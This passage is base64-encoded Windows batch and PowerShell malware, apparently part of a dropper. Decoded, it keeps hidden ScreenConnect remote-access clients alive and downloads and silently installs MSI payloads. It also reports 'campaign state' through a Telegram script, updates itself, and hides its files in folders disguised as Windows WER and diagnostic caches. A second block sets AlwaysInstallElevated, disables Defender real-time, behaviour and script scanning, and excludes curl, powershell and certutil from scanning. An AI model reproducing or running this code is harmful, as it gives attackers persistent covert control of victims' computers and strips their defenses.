CiAgICBzYyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYx
DQogICAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwNCiAgICBzYyBxdWVyeSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogICAgaWYgZXJy
b3JsZXZlbCAxIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2Zp
bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93
bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIg
Pj4iJUxPRyUiIDI+JjENCiAgKQ0KKQ0KcmVtIE0xNzogQUxUIHNlcnZpY2UgZW50cnkgZGVsZXRl
ZCBidXQgcHJvZHVjdCByZWdpc3RlcmVkIC0+IHJlcGFpci1ieS1HVUlEIGV2ZXJ5IHRpY2sNCnNj
IHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIGVy
cm9ybGV2ZWwgMSAoDQogIGVjaG8gYWx0X21pc3NpbmdfdHJ5X3JlcGFpcj4+IiVMT0clIg0KICBp
ZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRl
cmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIg
LUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAy
PiYxDQopDQpyZW0gKGV4dGVybWluYXRpb24gYWxyZWFkeSByYW4gcHJlLWhlYWwgaW4gW0VdOyBm
b3JlaWduIHN1cnZpdm9ycyBjb3VudGVkIHRoZXJlKQ0KDQpyZW0g4pSA4pSAIFtGXSBzdGVhbHRo
IHJlLXNlY3VyZSAocXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9uIHJlZnJlc2gpIOKUgOKUgA0KcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtQ29tbWFuZCAidHJ5IHsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnJVdEJScs
JyVFVEwlJyAtRXJyb3JBY3Rpb24gU3RvcCB9IGNhdGNoIHt9IiA+bnVsIDI+JjENCg0KcmVtIOKU
gOKUgCBbR10gcGVyaW9kaWMgZnVsbCByZS1zZWN1cmUgZXZlcnkgfjIgaCDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIANCnBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVX
RCVcb3duX3NlY3VyZS5jbWQnKSAtYW5kICgoIC1ub3QgKFRlc3QtUGF0aCAnJVdEJVxzZWMuZmxh
ZycpKSAtb3IgKCgoR2V0LURhdGUpIC0gKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJVdEJVxzZWMu
ZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsSG91cnMgLWdlIDIpKSl7IGV4aXQgMSB9IGVsc2Ug
eyBleGl0IDAgfSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVsIDEgKA0KICBlY2hvIHBlcmlvZGlj
IHJlLXNlY3VyZT4+IiVMT0clIg0KICBjYWxsICIlV0QlXG93bl9zZWN1cmUuY21kIiA+PiIlTE9H
JSIgMj4mMQ0KICBlY2hvIGRvbmU+IiVXRCVcc2VjLmZsYWciDQopDQoNCnJlbSDilIDilIAgW0hd
IGNhbXBhaWduIHN0YXRlICsgaG91cmx5IGNvbXBhY3QgZGlnZXN0IOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5w
czEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIg
IiVXRCUiIC1CdWlsZCAlTU9OVkVSJSA+bnVsIDI+JjENCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChUZXN0LVBhdGggJyVIQkZMQUclJykgLWFuZCAo
TmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclSEJGTEFHJScpLkxh
c3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAtbHQgNjApeyBleGl0IDAgfSBlbHNlIHsgZXhpdCAx
IH0iID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAgZWNobyBoYj4lSEJGTEFHJQ0KICBw
b3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlw
YXNzIC1GaWxlICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSBIQiAtTW9kZSBjb21wYWN0IC1C
dWlsZCAlTU9OVkVSJSAtQ291bnQgIUNPVU5UISA+bnVsIDI+JjENCiAgZWNobyBkaWdlc3QgSEIg
c2VudD4+IiVMT0clIg0KKQ0KDQpyZW0g4pSA4pSAIFtJXSBzZWxmLXVwZGF0ZSBhcHBseSAobGFz
dCB0aGluZyB0aGlzIHRpY2spIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgA0KaWYgIiVTRUxGX1VQRCUiPT0iMSIgKA0KICBlY2hvIHNlbGYtdXBkYXRlIGFwcGx5Pj4i
JUxPRyUiDQogIGF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQog
IG1vdmUgL3kgIiVXRCVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYx
DQopDQpyZW0ga2VlcCBkdWFsLXBhdGggYmFja3VwIGluIHN5bmMgZXZlcnkgdGljaw0KaWYgbm90
IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlV0QlXG93
bl9tb24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRsX21vbi5jbWQiID5udWwg
Mj4mMQ0KICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVcZXRsX21vbi5jbWQiID5u
dWwgMj4mMQ0KKQ0KZGVsIC9mIC9xICIlTVVURVglIiA+bnVsIDI+JjENCg0KZWNobyB0aWNrIGRv
bmU6IHByaW09JVBSSU1fT0slIGFsdD0lQUxUX09LJSBmb3JlaWduPSVGT1JFSUdOX0xFRlQlPj4i
JUxPRyUiDQplbmRsb2NhbA0KZXhpdCAvYiAwDQoNCnJlbSDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZAgaGVscGVycyDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZANCjpJbnN0YWxsTXNpDQpyZW0gJTE9dXJsICUyPXRhZw0Kc2V0
ICJVUkw9JX4xIg0Kc2V0ICJUQUc9JX4yIg0KZWNobyBbJVRBRyVdIGZldGNoICVVUkwlPj4iJUxP
RyUiDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUgLS1t
YXgtdGltZSAzMDAgLW8gIiVNU0klLnRtcCIgIiVVUkwlIiA+PiIlTE9HJSIgMj4mMQ0KZm9yICUl
RiBpbiAoIiVNU0klLnRtcCIpIGRvIGlmICUlfnpGIExFUSAxMDAwMDAwICgNCiAgZWNobyBbJVRB
RyVdIGZldGNoIGZhaWxlZD4+IiVMT0clIg0KICBkZWwgL2YgL3EgIiVNU0klLnRtcCIgPm51bCAy
PiYxDQogIGV4aXQgL2IgMQ0KKQ0KbW92ZSAveSAiJU1TSSUudG1wIiAiJU1TSSUiID5udWwgMj4m
MQ0KY2FsbCA6Tm9Nc2lQb2xpY3kNCnJlbSBNMTM6IHN0YWxlIHByaW1hcnkgZGlyIChzZXJ2aWNl
IGRlbGV0ZWQsIHByb2R1Y3QgdW5yZWdpc3RlcmVkKSBicmVha3MNCnJlbSB0aGUgU0MgaW5zdGFs
bGVyIGN1c3RvbSBhY3Rpb24gLSBjbGVhciBpdCBiZWZvcmUgaW5zdGFsbGluZw0Kc2MgcXVlcnkg
IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCmlmIGVycm9ybGV2
ZWwgMSBpZiBleGlzdCAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiAo
DQogIGVjaG8gc3RhbGVfcHJpbWFyeV9kaXJfY2xlYW4+PiIlTE9HJSINCiAgcm1kaXIgL3MgL3Eg
IiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQopDQpl
Y2hvIFslVEFHJV0gbXNpZXhlYyBpbnN0YWxsPj4iJUxPRyUiDQptc2lleGVjIC9pICIlTVNJJSIg
L3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdE
JVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0Kc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCmVj
aG8gWyVUQUclXSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQppZiAiIU1TSUVYSVQh
Ij09IjE2MTgiICgNCiAgZWNobyBbJVRBRyVdIG1zaV9idXN5X3JldHJ5Pj4iJUxPRyUiDQogIHRp
bWVvdXQgL3QgMzAgL25vYnJlYWsgPm51bA0KICBtc2lleGVjIC9pICIlTVNJJSIgL3FuIC9ub3Jl
c3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfaGVh
bDIubG9nIiA+bnVsIDI+JjENCiAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCiAgZWNobyBb
JVRBRyVdIG1zaWV4ZWNfcmV0cnkgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCikNCmNhbGwgOldh
aXRTdmMNCmV4aXQgL2IgMA0KDQo6UmVwYWlyUmVnaXN0ZXJlZA0KcmVtICUxPWZpbmdlcnByaW50
IC0gc2VydmljZSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQ6IHJlcGFpciBieSBHVUlE
Lg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglfjEpIiA+bnVsIDI+JjENCmlmIG5v
dCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwDQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEi
IGV4aXQgL2IgMQ0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0
aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIg
LUZwICIlfjEiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KY2FsbCA6V2FpdFN2Yw0K
ZXhpdCAvYiAwDQoNCjpSZXN0b3JlQWx0DQpyZW0gQUxUIHNlcnZpY2UgZ29uZSBidXQgc3RpbGwg
cmVnaXN0ZXJlZCAoU0MtZmFtaWx5IG1zaWV4ZWMgc2lkZSBlZmZlY3QpIC0gcmVwYWlyIGl0IHRv
by4NCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjEN
CmlmIG5vdCBlcnJvcmxldmVsIDEgZXhpdCAvYiAwDQplY2hvIGFsdCBtaXNzaW5nIC0gcmVwYWly
IGF0dGVtcHQ+PiIlTE9HJSINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxs
IC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxl
ICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29ya0Rp
ciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
JUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0
ICJBTFRfT0s9MSINCmV4aXQgL2IgMA0KDQo6Tm9Nc2lQb2xpY3kNCnJlZyBkZWxldGUgIkhLTE1c
U09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxl
TVNJIC9mID5udWwgMj4mMQ0KcmVnIGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNy
b3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcg
YWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIg
L3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmV4aXQgL2IgMA0K
DQo6V2FpdFN2Yw0Kc2V0ICJUUklFUz0wIg0KOldhaXRMb29wDQpzYyBxdWVyeSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVy
cm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJTV9PSz0xIg0KICBl
eGl0IC9iIDANCikNCnNldCAvYSBUUklFUys9MQ0KaWYgJVRSSUVTJSBHRVEgMTAgZXhpdCAvYiAx
DQpwaW5nIDEyNy4wLjAuMSAtbiA3ID5udWwgMj4mMQ0KZ290byA6V2FpdExvb3ANCg0KOlRnU3Rh
dGUNCnNldCAiTkVXU1RBVEU9JX4xIg0Kc2V0ICJNU0c9JX4yIg0Kc2V0ICJPTERTVEFURT0iDQpp
ZiBleGlzdCAiJVNUQVRFJSIgc2V0IC9wIE9MRFNUQVRFPTwiJVNUQVRFJSINCnJlbSByYXRlLWxp
bWl0IHJlcGVhdGVkIERPV04vRkFJTDogbWF4IDEgYWxlcnQgcGVyIDMwIG1pbiB3aGlsZSBzdHVj
aw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6TWF5YmVTdXBwcmVzcw0KaWYgL0kg
IiVORVdTVEFURSUiPT0iRkFJTCIgZ290byA6TWF5YmVTdXBwcmVzcw0KZ290byA6U2VuZEFsZXJ0
DQo6TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0iJU9MRFNUQVRFJSIgaWYgZXhp
c3QgIiVXRCVcdGdfc2VudC5mbGFnIiAoDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0
ZXJhbFBhdGggJyVXRCVcdGdfc2VudC5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVz
IC1sdCAzMCl7ZXhpdCAwfWVsc2V7ZXhpdCAxfSIgPm51bCAyPiYxDQogIGlmIG5vdCBlcnJvcmxl
dmVsIDEgKA0KICAgIGVjaG8gdGdfc3VwcHJlc3NlZF8lTkVXU1RBVEUlPj4iJUxPRyUiDQogICAg
ZXhpdCAvYiAwDQogICkNCikNCjpTZW5kQWxlcnQNCmVjaG8gJU5FV1NUQVRFJT4iJVNUQVRFJSIN
CmVjaG8gc2VudD4iJVdEJVx0Z19zZW50LmZsYWciDQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXHRnX3JlcG9y
dC5wczEiIC1TdGF0ZSAlTkVXU1RBVEUlIC1TdW1tYXJ5ICIlTVNHJSIgLUJ1aWxkICVNT05WRVIl
IC1Db3VudCAlQ09VTlQlID5udWwgMj4mMQ0KZWNobyB0ZyBzdGF0ZSAlTkVXU1RBVEUlIHNlbnQ+
PiIlTE9HJSINCmV4aXQgL2IgMA0K
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM2IC0gaWRlbnRpdHktYXdh
cmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNpb25zL0FDTDsgbm8g
YXR0ci1sb2NrIG9uIG11dGFibGUgcGF5bG9hZHMNCnNldGxvY2FsIEVuYWJsZUV4dGVuc2lvbnMg
RW5hYmxlRGVsYXllZEV4cGFuc2lvbg0Kc2V0ICJXRD0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxX
aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJXRDI9JVByb2dyYW1EYXRhJVxNaWNyb3Nv
ZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZSINCnNldCAiTE9HPSVXRCVcYm9vdC5lcnIiDQpz
ZXQgIlBSSU09U2NyZWVuQ29ubmVjdCBDbGllbnQgKDVmNjAxMDU3OTg1MmU1MDcpIg0Kc2V0ICJB
TFQ9U2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpIg0Kc2V0ICJLRUVQMT01
ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJLRUVQMj1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0ICJQRj0l
UHJvZ3JhbUZpbGVzJSINCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJUQVNL
Uk9PVD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcVGFza3MiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIg
bWtkaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QyJSIgbWtkaXIgIiVXRDIl
IiA+bnVsIDI+JjENCmVjaG8gc2VjdXJlX2JlZ2luICVEQVRFJSAlVElNRSUgUzY+PiIlTE9HJSIN
Cg0KUkVNIC0tLSBOZXV0cmFsaXplIE1TSSBibG9jayBwb2xpY2llcyAoMTYyNSkgLS0tDQpSRU0g
RGlzYWJsZU1TSTogMD1hbGxvdywgMT1ub24tYWRtaW4gb25seSwgMj1hbGwgLT4gZm9yY2UgMA0K
cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3Yg
QWx3YXlzSW5zdGFsbEVsZXZhdGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVn
IGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0NVXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZh
dGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KDQpSRU0gLS0tIERlZmVuZGVyOiBy
ZWdpc3RyeSBleGNsdXNpb25zIChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMpIC0tLQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3Yg
RGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdP
UkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwt
VGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlSU9BVlByb3RlY3Rpb24gL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0
U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
V0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdB
UkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRDIl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIkM6XFdpbmRv
d3NcVGVtcCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
VEVNUCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZU
V0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5u
dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAy
JSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51
bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
MiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMu
ZXhlIGN1cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNv
bm5lY3QuQ2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkg
ZG8gKA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
IDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2Vy
IHRoYW4gcmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlv
blByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVu
Y2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURp
c2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJ
T0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5u
aW5nICR0cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2lu
ZG93c1xUZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUp
JywnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UDIlKScpOyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJv
Z3JhbUZpbGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEg
MCB8IEZvckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBm
ODY9W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRw
Zjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5D
b25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVs
bE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1P
YmplY3QgLVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7
IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9y
ZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hl
bGwuZXhlJywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScs
J1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4
